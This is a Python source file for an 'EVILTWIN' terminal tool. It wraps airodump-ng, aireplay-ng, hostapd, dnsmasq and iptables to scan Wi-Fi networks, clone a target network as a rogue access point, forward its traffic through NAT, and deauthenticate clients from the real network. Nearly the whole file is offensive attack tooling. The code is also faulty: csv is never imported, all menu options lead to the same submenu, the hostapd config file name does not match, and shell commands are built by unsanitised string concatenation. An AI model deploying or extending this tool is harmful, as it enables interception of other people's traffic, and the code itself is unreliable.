import os
import sys
import json
from simple_term_menu import TerminalMenu

with open("conf/local.json") as json_data_file:
	data = json.load(json_data_file)

sys.path.append(data["pathSRC"])
import settings

def shell(command):
	stream = os.popen(command)
	return stream.read()

def cls():
	os.system('cls' if os.name=='nt' else 'clear')

def displayMenu():
	cls()
	shell('clear')
	print(shell("figlet EVILTWIN"))
	print("Interface AP :", settings.globals["interfaceAP"])
	print("Interface Internet :", settings.globals["interfaceInternet"])
	print("Interface DeAuth :", settings.globals["interfaceDeauth"])
	print("Selected WIFI :", settings.globals["targetWifi"], "\n")

	options = ["Select Interfaces", "Select WIFI target to clone", "Launch Deauth", "Exit"]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()

	match menu_entry_index:
		case 0:
			displayInterfaceMenu()
		case 1:
			displayInterfaceMenu()
		case 2:
			displayInterfaceMenu()
		case 3:
			return False
	return True

def displayInterfaceMenu():
	options = ["Select Interface AP", "Select Interface Internet", "Select Interface Deauth", "Exit"]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()

	match menu_entry_index:
		case 0:
			displayInterfaceNames('interfaceAP')
		case 1:
			displayInterfaceNames('interfaceInternet')
		case 2:
			displayInterfaceNames('interfaceDeauth')
		case 3:
			return False
	return True

def displayInterfaceNames(interface):
	options = shell("ip -o link show | awk -F': ' '{print $2}'").split("\n")
	del options[-1]
	terminal_menu = TerminalMenu(options)
	menu_entry_index = terminal_menu.show()
	settings.globals[interface] = options[menu_entry_index]

def print_array(array):
	for row in array:
		print(row)

def airoScan(wlan):
	#shell("rm res/*")
	shell("airodump-ng " + wlan + " -w res/captures & sleep 10; pkill airodump")

def firewallRouting(wlan):
	shell("echo 1 > /proc/sys/net/ipv4/ip_forward") #MODE FORWARD
	shell("iptables -F")
	shell("iptables -X")
	shell("iptables -I POSTROUTING -t nat -o " + wlan + " -j MASQUERADE")

def dnsmasqServer(file):
	shell("dnsmasq -d -C " + file)

def rogueApStart(wlan):
	shell("airmon-ng start " + wlan)
	shell("ip addr 192.168.1.1/24 dev " + wlan)

def hostapdInit(wlan, ssid):
	with open('confRogueAP.txt', 'w') as f:
		f.write('interface=' + wlan + '\n')
		f.write('ssid=' + ssid + '\n')
		f.write('hw_mode=g\n')
		f.write('channel=3')

def hostapdEnable():
	shell('hostapd confRogueAP')

def deAuth(wlan, bssid, MacDevice):
	shell('aireplay-ng -0 1 -a '+ bssid + ' -c ' + MacDevice + ' ' + wlan)

def airoScanTarget(wlan, bssid, channel):
	shell('airodump-ng -d ' + bssid + ' -c' + channel + ' ' + wlan)

def get_aps():
    accessPoints = {"header" : [], "aps" : []}
    with open("res/captures-01.csv", "r") as file:
        reader = csv.reader(file)
        for row in reader:
            accessPoints["aps"].append(row)

    # Set header, and remove it from aps array
    accessPoints["aps"].pop(0)
    accessPoints["header"] = accessPoints["aps"][0]
    accessPoints["aps"].pop(0)

    # Remove second part of aps infos
    index = None
    for i, ap in enumerate(accessPoints["aps"]):
        if not ap:
            index = i
            break

    del accessPoints["aps"][index:]

    return accessPoints
